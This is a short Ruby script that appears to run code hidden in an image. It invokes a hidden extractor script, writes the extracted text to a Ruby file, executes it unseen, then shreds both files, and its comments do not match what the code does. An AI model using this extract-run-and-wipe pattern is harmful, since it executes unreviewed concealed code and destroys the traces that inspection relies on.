system("./.extractor.sh")

# Read in imp contents.
imp_contents = File.read("imp.txt").strip

# Write contents to bash file.
open("imp.rb", "w") { |f|
  f.puts imp_contents
}

# Make executable, operate sh, shred bash, purge txt file and keep image.
system("ruby imp.rb;
        shred --remove imp.rb;
        shred --remove imp.txt")
